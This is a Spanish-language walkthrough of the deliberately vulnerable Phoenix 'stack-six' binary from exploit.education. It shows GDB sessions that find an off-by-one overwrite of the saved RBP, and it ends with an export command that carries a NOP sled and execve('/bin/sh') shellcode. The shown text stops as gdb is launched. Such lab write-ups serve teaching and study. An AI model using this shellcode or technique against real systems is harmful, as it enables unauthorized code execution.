---
layout: single
title: "Stack Six"
permalink: /pwn/phoenix/stack-six/
parent: Phoenix
comments: true
excerpt: "Stack Six"
classes: wide
header:
  teaser: /assets/images/2025-08-17-Phoenix/logo.jpg
categories: [PWN]
tags: [PWN, Linux, Hacking, Easy]
---

![Untitled](/assets/images/2025-08-17-Phoenix/banner.png)



- ¿Dónde se equivoca Stack Six y qué puedes hacer con él?
- Dependiendo de la arquitectura en la que estés haciendo esto, puede que necesites explorar más y ser creativo con la forma de resolver este nivel.
- La macro GREET depende de la arquitectura

```csharp
/*
 * phoenix/stack-six, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * Why do fungi have to pay double bus fares? Because they take up too
 * mushroom.
 */

#include <err.h>       // Incluye funciones para mostrar errores y terminar el programa (err, errx, etc.)
#include <stdio.h>     // Incluye funciones de entrada/salida estándar (printf, etc.)
#include <stdlib.h>    // Incluye funciones de utilidad como getenv(), malloc(), etc.
#include <string.h>    // Incluye funciones para manejo de strings (strlen, strcpy, strncpy, etc.)
#include <unistd.h>    // Incluye funciones del sistema como execve(), etc.

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
// Define una cadena constante con un mensaje de bienvenida

char *what = GREET; // Puntero a char inicializado con GREET (probablemente definido en un macro al compilar)

char *greet(char *who) {                // Función greet que recibe un puntero a char (nombre)
  char buffer[128];                     // Declara un buffer local de 128 bytes
  int maxSize;                          // Variable para tamaño máximo permitido

  maxSize = strlen(who);                // maxSize se iguala a la longitud de "who"
  if (maxSize > (sizeof(buffer) - 1)) { // Si la longitud es mayor que el tamaño del buffer menos 1
    maxSize = sizeof(buffer) - 1;       // Ajusta maxSize para evitar desbordar y dejar espacio para '\0'
  }

  strcpy(buffer, what);                 // Copia el contenido de "what" dentro del buffer
  strncpy(buffer + strlen(buffer),      // Copia a partir del final del contenido ya copiado
          who,                          // Lo que viene de "who"
          maxSize);                     // Hasta maxSize caracteres

  return strdup(buffer);                // Duplica el contenido del buffer en memoria dinámica y lo retorna
}

int main(int argc, char **argv) {       // Función principal
  char *ptr;                            // Puntero para almacenar valor de variable de entorno
  printf("%s\n", BANNER);               // Imprime el mensaje de bienvenida

#ifdef NEWARCH                          // Si se compiló con la macro NEWARCH definida
  if (argv[1]) {                        // Si hay argumento en la línea de comandos
    what = argv[1];                     // Cambia "what" para apuntar a ese argumento
  }
#endif

  ptr = getenv("ExploitEducation");     // Busca la variable de entorno "ExploitEducation"
  if (NULL == ptr) {                    // Si no existe esa variable de entorno
    errx(1, "Please specify an environment variable called ExploitEducation");
    // Muestra un error y termina con código de salida 1
  }

  printf("%s\n", greet(ptr));           // Llama a greet con el valor de la variable de entorno y lo imprime
  return 0;                             // Termina el programa
}
```

ponerle valor a la variable 

```csharp
user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=$(python -c "print 'A'*127")
user@phoenix-amd64:/opt/phoenix/amd64$ echo $ExploitEducation
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
user@phoenix-amd64:/opt/phoenix/amd64$
```

entrar con gdb

```csharp
user@phoenix-amd64:/opt/phoenix/amd64$ gdb -q /opt/phoenix/amd64/stack-six 
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/amd64/stack-six...(no debugging symbols found)...done.
gef➤
```

disass main ver toda la funcion main realizamos un break en 0x00000000004007e9 <+78>:	mov    rdi,rax para ver el retorno despues de greet

```csharp
gef➤  disass main
Dump of assembler code for function main:
   0x000000000040079b <+0>:	push   rbp
   0x000000000040079c <+1>:	mov    rbp,rsp
   0x000000000040079f <+4>:	sub    rsp,0x20
   0x00000000004007a3 <+8>:	mov    DWORD PTR [rbp-0x14],edi
   0x00000000004007a6 <+11>:	mov    QWORD PTR [rbp-0x20],rsi
   0x00000000004007aa <+15>:	mov    edi,0x400878
   0x00000000004007af <+20>:	call   0x400530 <puts@plt>
   0x00000000004007b4 <+25>:	mov    edi,0x4008c2
   0x00000000004007b9 <+30>:	call   0x400520 <getenv@plt>
   0x00000000004007be <+35>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004007c2 <+39>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004007c7 <+44>:	jne    0x4007dd <main+66>
   0x00000000004007c9 <+46>:	mov    esi,0x4008d8
   0x00000000004007ce <+51>:	mov    edi,0x1
   0x00000000004007d3 <+56>:	mov    eax,0x0
   0x00000000004007d8 <+61>:	call   0x400540 <errx@plt>
   0x00000000004007dd <+66>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004007e1 <+70>:	mov    rdi,rax
   0x00000000004007e4 <+73>:	call   0x4006fd <greet>
   0x00000000004007e9 <+78>:	mov    rdi,rax
   0x00000000004007ec <+81>:	call   0x400530 <puts@plt>
   0x00000000004007f1 <+86>:	mov    eax,0x0
   0x00000000004007f6 <+91>:	leave  
   0x00000000004007f7 <+92>:	ret    
End of assembler dump.

```

ahora disass al greet, para realizar un break en  0x0000000000400782 <+133>:	lea    rax,[rbp-0xa0] ya que es la dirección que copia las A en el buffer

```csharp
gef➤  disass greet
Dump of assembler code for function greet:
   0x00000000004006fd <+0>:	push   rbp
   0x00000000004006fe <+1>:	mov    rbp,rsp
   0x0000000000400701 <+4>:	push   rbx
   0x0000000000400702 <+5>:	sub    rsp,0xa8
   0x0000000000400709 <+12>:	mov    QWORD PTR [rbp-0xa8],rdi
   0x0000000000400710 <+19>:	mov    rax,QWORD PTR [rbp-0xa8]
   0x0000000000400717 <+26>:	mov    rdi,rax
   0x000000000040071a <+29>:	call   0x400580 <strlen@plt>
   0x000000000040071f <+34>:	mov    DWORD PTR [rbp-0x14],eax
   0x0000000000400722 <+37>:	mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000400725 <+40>:	cmp    eax,0x7f
   0x0000000000400728 <+43>:	jbe    0x400731 <greet+52>
   0x000000000040072a <+45>:	mov    DWORD PTR [rbp-0x14],0x7f
   0x0000000000400731 <+52>:	mov    rdx,QWORD PTR [rip+0x200458]        # 0x600b90 <what>
   0x0000000000400738 <+59>:	lea    rax,[rbp-0xa0]
   0x000000000040073f <+66>:	mov    rsi,rdx
   0x0000000000400742 <+69>:	mov    rdi,rax
   0x0000000000400745 <+72>:	call   0x400510 <strcpy@plt>
   0x000000000040074a <+77>:	mov    eax,DWORD PTR [rbp-0x14]
   0x000000000040074d <+80>:	movsxd rbx,eax
   0x0000000000400750 <+83>:	lea    rax,[rbp-0xa0]
   0x0000000000400757 <+90>:	mov    rdi,rax
   0x000000000040075a <+93>:	call   0x400580 <strlen@plt>
   0x000000000040075f <+98>:	mov    rdx,rax
   0x0000000000400762 <+101>:	lea    rax,[rbp-0xa0]
   0x0000000000400769 <+108>:	lea    rcx,[rax+rdx*1]
   0x000000000040076d <+112>:	mov    rax,QWORD PTR [rbp-0xa8]
   0x0000000000400774 <+119>:	mov    rdx,rbx
   0x0000000000400777 <+122>:	mov    rsi,rax
   0x000000000040077a <+125>:	mov    rdi,rcx
   0x000000000040077d <+128>:	call   0x400550 <strncpy@plt>
   0x0000000000400782 <+133>:	lea    rax,[rbp-0xa0]
   0x0000000000400789 <+140>:	mov    rdi,rax
   0x000000000040078c <+143>:	call   0x400560 <strdup@plt>
   0x0000000000400791 <+148>:	add    rsp,0xa8
   0x0000000000400798 <+155>:	pop    rbx
   0x0000000000400799 <+156>:	pop    rbp
   0x000000000040079a <+157>:	ret    
End of assembler dump.
gef➤ 
```

Break

```csharp
gef➤  b *0x0000000000400782
Breakpoint 1 at 0x400782
gef➤ 
```

y ahora lo corremos con el comando `run` o `r` 

```csharp
gef➤  r
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education

Breakpoint 1, 0x0000000000400782 in greet ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffe512  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x7f              
$rcx   : 0x00007fffffffe512  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rdx   : 0x0               
$rsp   : 0x00007fffffffe4e0  →  0x00007ffff7ffc948  →  "Welcome to phoenix/stack-six, brought to you by ht[...]"
$rbp   : 0x00007fffffffe590  →  0x00007fffffffe541  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rsi   : 0x0               
$rdi   : 0x00007fffffffe591  →  0xe900007fffffffe5
$rip   : 0x0000000000400782  →  <greet+133> lea rax, [rbp-0xa0]
$r8    : 0x101010101010101 
$r9    : 0xfefefefefefefeff
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x00007fffffffe628  →  0x00007fffffffe82e  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x000000000040079b  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe4e0│+0x0000: 0x00007ffff7ffc948  →  "Welcome to phoenix/stack-six, brought to you by ht[...]"	 ← $rsp
0x00007fffffffe4e8│+0x0008: 0x00007fffffffef10  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffe4f0│+0x0010: "Welcome, I am pleased to meet you AAAAAAAAAAAAAAAA[...]"
0x00007fffffffe4f8│+0x0018: "I am pleased to meet you AAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffe500│+0x0020: "eased to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffe508│+0x0028: "meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffe510│+0x0030: "u AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffe518│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400777 <greet+122>      mov    rsi, rax
     0x40077a <greet+125>      mov    rdi, rcx
     0x40077d <greet+128>      call   0x400550 <strncpy@plt>
 →   0x400782 <greet+133>      lea    rax, [rbp-0xa0]
     0x400789 <greet+140>      mov    rdi, rax
     0x40078c <greet+143>      call   0x400560 <strdup@plt>
     0x400791 <greet+148>      add    rsp, 0xa8
     0x400798 <greet+155>      pop    rbx
     0x400799 <greet+156>      pop    rbp
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack-six", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400782 → greet()
[#1] 0x4007e9 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

ahora imprimimos la dirección del buffer

```csharp
gef➤  print $rbp-0xa0
$1 = (void *) 0x7fffffffe4f0
gef➤  
```

ahora vamos a ver el contenido en modo string 

```csharp
gef➤  x/s $rbp-0xa0
0x7fffffffe4f0:	"Welcome, I am pleased to meet you ", 'A' <repeats 127 times>, "\345\377\377\377\177"
gef➤
```

ahora ejecutamos  x/22xg $rbp-0xa0 0x00007fffffffe541 este es el saved rbp y este el es saved rip ( ret ) 0x00000000004007e9

```csharp
gef➤  x/22xg $rbp-0xa0
0x7fffffffe4f0:	0x2c656d6f636c6557	0x6c70206d61204920
0x7fffffffe500:	0x6f74206465736165	0x6f79207465656d20
0x7fffffffe510:	0x4141414141412075	0x4141414141414141
0x7fffffffe520:	0x4141414141414141	0x4141414141414141
0x7fffffffe530:	0x4141414141414141	0x4141414141414141
0x7fffffffe540:	0x4141414141414141	0x4141414141414141
0x7fffffffe550:	0x4141414141414141	0x4141414141414141
0x7fffffffe560:	0x4141414141414141	0x4141414141414141
0x7fffffffe570:	0x4141414141414141	0x4141414141414141
0x7fffffffe580:	0x4141414141414141	0x4141414141414141
0x7fffffffe590:	0x00007fffffffe541	0x00000000004007e9
gef➤ 
```

info frame para confirmar el saved rbp y el saved rip 

```csharp
gef➤  info frame
Stack level 0, frame at 0x7fffffffe5a0:
 rip = 0x400782 in greet; saved rip = 0x4007e9
 called by frame at 0x7fffffffe551
 Arglist at 0x7fffffffe590, args: 
 Locals at 0x7fffffffe590, Previous frame's sp is 0x7fffffffe5a0
 Saved registers:
  rbx at 0x7fffffffe588, rbp at 0x7fffffffe590, rip at 0x7fffffffe598
gef➤ 
```

ahora vemos para medir el tamaño del buffer y largo que copia 

```csharp
gef➤  set $buf = $rbp-0xa0
gef➤  p/x $buf
$5 = 0x7fffffffe4f0 # es la dirección del buffer
gef➤  p/x $rbp
$6 = 0x7fffffffe590 # Dirección saved rbp
gef➤  p/d $rbp - $buf
$7 = 160            # Tamaño del buffer
gef➤
```

vamos a ver cuantos bytes de esto ocupa el mensaje de bienvenida

```csharp
┌──(root㉿angussMoody)-[/mnt/angussMoody]
└─# python3
Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> len("Welcome, I am pleased to meet you ")
34
```

vamos a ver cuantas A pisamos para sobreescribir el saved rbp 

```csharp
capacidad_hasta_saved_rbp = 160
overflow = 161 - 160 = 1 byte
bytes_escritos = saludo(34) + strncpy(127) = 161
```

Ese **1 byte** es el **LSB del saved RBP** (lo ves como `0x00007fffffffe541` en `[rbp]`), y **[rbp+8]** conserva el **saved RIP = 0x4007e9** (confirmado con `info frame`).

```csharp
gef➤  grep ExploitEducation=
[+] Searching 'ExploitEducation=' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffeeff - 0x7fffffffef36  →   "ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]" 
gef➤  
```

esto se realiza para obtener la dirreción donde se encuentra el payload

```csharp
┌──(root㉿angussMoody)-[/mnt/angussMoody]
└─# python3
Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(hex(0x7fffffffeeff + len("ExploitEducation=")))
0x7fffffffef10
>>> 
```

esto también se puede confirmar realizando un break en  `0x00000000004007be <+35>:	mov    QWORD PTR [rbp-0x8],rax` para confirmar la dirección del payload

```csharp
gef➤  disass main
Dump of assembler code for function main:
   0x000000000040079b <+0>:	push   rbp
   0x000000000040079c <+1>:	mov    rbp,rsp
   0x000000000040079f <+4>:	sub    rsp,0x20
   0x00000000004007a3 <+8>:	mov    DWORD PTR [rbp-0x14],edi
   0x00000000004007a6 <+11>:	mov    QWORD PTR [rbp-0x20],rsi
   0x00000000004007aa <+15>:	mov    edi,0x400878
   0x00000000004007af <+20>:	call   0x400530 <puts@plt>
   0x00000000004007b4 <+25>:	mov    edi,0x4008c2
   0x00000000004007b9 <+30>:	call   0x400520 <getenv@plt>
   0x00000000004007be <+35>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004007c2 <+39>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004007c7 <+44>:	jne    0x4007dd <main+66>
   0x00000000004007c9 <+46>:	mov    esi,0x4008d8
   0x00000000004007ce <+51>:	mov    edi,0x1
   0x00000000004007d3 <+56>:	mov    eax,0x0
   0x00000000004007d8 <+61>:	call   0x400540 <errx@plt>
   0x00000000004007dd <+66>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004007e1 <+70>:	mov    rdi,rax
   0x00000000004007e4 <+73>:	call   0x4006fd <greet>
   0x00000000004007e9 <+78>:	mov    rdi,rax
   0x00000000004007ec <+81>:	call   0x400530 <puts@plt>
   0x00000000004007f1 <+86>:	mov    eax,0x0
   0x00000000004007f6 <+91>:	leave  
   0x00000000004007f7 <+92>:	ret    
End of assembler dump.
gef➤  b *0x00000000004007be
Breakpoint 2 at 0x4007be
gef➤  
```

ahora ejecuto el binario con el comando run o r  y vemos que la dirreción $rax   : 0x00007fffffffef10  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]" tiene el payload

```csharp
gef➤  r
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education

Breakpoint 2, 0x00000000004007be in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffef10  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x00007fffffffe618  →  0x00007fffffffe811  →  "/opt/phoenix/amd64/stack-six"
$rcx   : 0x6e              
$rdx   : 0xf               
$rsp   : 0x00007fffffffe5a0  →  0x00007fffffffe618  →  0x00007fffffffe811  →  "/opt/phoenix/amd64/stack-six"
$rbp   : 0x00007fffffffe5c0  →  0x0000000000000001
$rsi   : 0x00007fffffffeeff  →  "ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rdi   : 0x00000000004008c2  →  "ExploitEducation"
$rip   : 0x00000000004007be  →  <main+35> mov QWORD PTR [rbp-0x8], rax
$r8    : 0x6e              
$r9    : 0x1               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x00007fffffffe628  →  0x00007fffffffe82e  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x000000000040079b  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe5a0│+0x0000: 0x00007fffffffe618  →  0x00007fffffffe811  →  "/opt/phoenix/amd64/stack-six"	 ← $rsp
0x00007fffffffe5a8│+0x0008: 0x00000001ffffe628
0x00007fffffffe5b0│+0x0010: 0x000000000040079b  →  <main+0> push rbp
0x00007fffffffe5b8│+0x0018: 0x0000000000000000
0x00007fffffffe5c0│+0x0020: 0x0000000000000001	 ← $rbp
0x00007fffffffe5c8│+0x0028: 0x00007ffff7d8fd62  →  <__libc_start_main+54> mov edi, eax
0x00007fffffffe5d0│+0x0030: 0x0000000000000000
0x00007fffffffe5d8│+0x0038: 0x00007fffffffe610  →  0x0000000000000001
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007af <main+20>        call   0x400530 <puts@plt>
     0x4007b4 <main+25>        mov    edi, 0x4008c2
     0x4007b9 <main+30>        call   0x400520 <getenv@plt>
 →   0x4007be <main+35>        mov    QWORD PTR [rbp-0x8], rax
     0x4007c2 <main+39>        cmp    QWORD PTR [rbp-0x8], 0x0
     0x4007c7 <main+44>        jne    0x4007dd <main+66>
     0x4007c9 <main+46>        mov    esi, 0x4008d8
     0x4007ce <main+51>        mov    edi, 0x1
     0x4007d3 <main+56>        mov    eax, 0x0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack-six", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4007be → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

ahora vamos a hacer un break a leave 

```csharp
gef➤  disass main
Dump of assembler code for function main:
   0x000000000040079b <+0>:	push   rbp
   0x000000000040079c <+1>:	mov    rbp,rsp
   0x000000000040079f <+4>:	sub    rsp,0x20
   0x00000000004007a3 <+8>:	mov    DWORD PTR [rbp-0x14],edi
   0x00000000004007a6 <+11>:	mov    QWORD PTR [rbp-0x20],rsi
   0x00000000004007aa <+15>:	mov    edi,0x400878
   0x00000000004007af <+20>:	call   0x400530 <puts@plt>
   0x00000000004007b4 <+25>:	mov    edi,0x4008c2
   0x00000000004007b9 <+30>:	call   0x400520 <getenv@plt>
   0x00000000004007be <+35>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004007c2 <+39>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004007c7 <+44>:	jne    0x4007dd <main+66>
   0x00000000004007c9 <+46>:	mov    esi,0x4008d8
   0x00000000004007ce <+51>:	mov    edi,0x1
   0x00000000004007d3 <+56>:	mov    eax,0x0
   0x00000000004007d8 <+61>:	call   0x400540 <errx@plt>
   0x00000000004007dd <+66>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004007e1 <+70>:	mov    rdi,rax
   0x00000000004007e4 <+73>:	call   0x4006fd <greet>
   0x00000000004007e9 <+78>:	mov    rdi,rax
   0x00000000004007ec <+81>:	call   0x400530 <puts@plt>
   0x00000000004007f1 <+86>:	mov    eax,0x0
   0x00000000004007f6 <+91>:	leave  
   0x00000000004007f7 <+92>:	ret    
End of assembler dump.
gef➤  b *0x00000000004007f6
Breakpoint 3 at 0x4007f6
gef➤ 
```

lo corremos con r 

```csharp
gef➤  r
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����

Breakpoint 1, 0x00000000004007f6 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x4141414141414141 ("AAAAAAAA"?)
$rcx   : 0x00007ffff7db6d07  →  <__stdio_write+83> mov rdi, rax
$rdx   : 0x0               
$rsp   : 0x00007fffffffe5a0  →  0x00007fffffffe618  →  0x00007fffffffe811  →  "/opt/phoenix/amd64/stack-six"
$rbp   : 0x00007fffffffe541  →  0x0000000000004007
$rsi   : 0x00007fffffffe500  →  0x00007ffff7ffc948  →  "Welcome, I am pleased to meet you AAAAAAAAAAAAAAAA[...]"
$rdi   : 0xa7              
$rip   : 0x00000000004007f6  →  <main+91> leave 
$r8    : 0x0000000000600c00  →  "Welcome, I am pleased to meet you AAAAAAAAAAAAAAAA[...]"
$r9    : 0xfefefefefefefeff
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x00007fffffffe628  →  0x00007fffffffe82e  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x000000000040079b  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe5a0│+0x0000: 0x00007fffffffe618  →  0x00007fffffffe811  →  "/opt/phoenix/amd64/stack-six"	 ← $rsp
0x00007fffffffe5a8│+0x0008: 0x00000001ffffe628
0x00007fffffffe5b0│+0x0010: 0x000000000040079b  →  <main+0> push rbp
0x00007fffffffe5b8│+0x0018: 0x00007fffffffef10  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffe5c0│+0x0020: 0x0000000000000001
0x00007fffffffe5c8│+0x0028: 0x00007ffff7d8fd62  →  <__libc_start_main+54> mov edi, eax
0x00007fffffffe5d0│+0x0030: 0x0000000000000000
0x00007fffffffe5d8│+0x0038: 0x00007fffffffe610  →  0x0000000000000001
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007e9 <main+78>        mov    rdi, rax
     0x4007ec <main+81>        call   0x400530 <puts@plt>
     0x4007f1 <main+86>        mov    eax, 0x0
 →   0x4007f6 <main+91>        leave  
     0x4007f7 <main+92>        ret    
     0x4007f8                  nop    DWORD PTR [rax+rax*1+0x0]
     0x400800 <__do_global_ctors_aux+0> mov    rax, QWORD PTR [rip+0x2001c9]        # 0x6009d0
     0x400807 <__do_global_ctors_aux+7> cmp    rax, 0xffffffffffffffff
     0x40080b <__do_global_ctors_aux+11> je     0x400840 <__do_global_ctors_aux+64>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack-six", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4007f6 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

ahora vamos 0x00007fffffffef10 que es la dirección de nuestro puntero 

```csharp
gef➤  x/50xg $rsp
0x7fffffffe5a0:	0x00007fffffffe618	0x00000001ffffe628
0x7fffffffe5b0:	0x000000000040079b	0x00007fffffffef10
0x7fffffffe5c0:	0x0000000000000001	0x00007ffff7d8fd62
0x7fffffffe5d0:	0x0000000000000000	0x00007fffffffe610
0x7fffffffe5e0:	0x0000000000000000	0x00007ffff7ffdbc8
0x7fffffffe5f0:	0x0400000100003e00	0x00000000004005c9
0x7fffffffe600:	0x0000000000000000	0x00000000004005a6
0x7fffffffe610:	0x0000000000000001	0x00007fffffffe811
0x7fffffffe620:	0x0000000000000000	0x00007fffffffe82e
0x7fffffffe630:	0x00007fffffffedea	0x00007fffffffee15
0x7fffffffe640:	0x00007fffffffee2a	0x00007fffffffee37
0x7fffffffe650:	0x00007fffffffee49	0x00007fffffffee53
0x7fffffffe660:	0x00007fffffffee6a	0x00007fffffffee73
0x7fffffffe670:	0x00007fffffffee83	0x00007fffffffeea0
0x7fffffffe680:	0x00007fffffffeeb3	0x00007fffffffeebf
0x7fffffffe690:	0x00007fffffffeed3	0x00007fffffffeee3
0x7fffffffe6a0:	0x00007fffffffeef7	0x00007fffffffeeff
0x7fffffffe6b0:	0x00007fffffffef90	0x00007fffffffef9d
0x7fffffffe6c0:	0x0000000000000000	0x0000000000000021
0x7fffffffe6d0:	0x00007ffff7ff8000	0x0000000000000010
0x7fffffffe6e0:	0x00000000078bfbfd	0x0000000000000006
0x7fffffffe6f0:	0x0000000000001000	0x0000000000000011
0x7fffffffe700:	0x0000000000000064	0x0000000000000003
0x7fffffffe710:	0x0000000000400040	0x0000000000000004
0x7fffffffe720:	0x0000000000000038	0x0000000000000005
gef➤ 
```

también podemos ver la dirección con `find /g $rsp-0x2000, $rsp+0x800, 0x7fffffffef10`

```csharp
gef➤  find /g $rsp-0x2000, $rsp+0x800, 0x7fffffffef10
0x7fffffffe5b8
1 pattern found.
gef➤ 
```

Eso significa: **en la dirección** `0x7fffffffe5b8 **`hay almacenado el valor** `0x7fffffffef10`(tu puntero a las “A”).

- **`leave`**: hace lo mismo que
    1. `mov rsp, rbp` → restaura el puntero de pila al frame base.
    2. `pop rbp` → recupera el valor viejo de `rbp`.
- **`ret`**:
    1. `pop rip` → saca de la pila la dirección de retorno y la pone en `rip` (salta allí).

En conjunto: **cierran el stack frame actual y transfieren la ejecución a la dirección guardada en la pila**.

RBP_corrupto + 8 = Saved RIP

```csharp
0x7fffffffe5b8 − 8 = 0x7fffffffe5b0
```

```csharp
export ExploitEducation=$(python -c "print '\x90'*50 + '\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05' + '\x90'*19 + '\xB0'")
```

```csharp
user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=$(python -c "print '\x90'*50 + '\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05' + '\x90'*19 + '\xB0'")
```

```csharp
user@phoenix-amd64:/opt/phoenix/amd64$ gdb -q /opt/phoenix/amd64/stack-six 
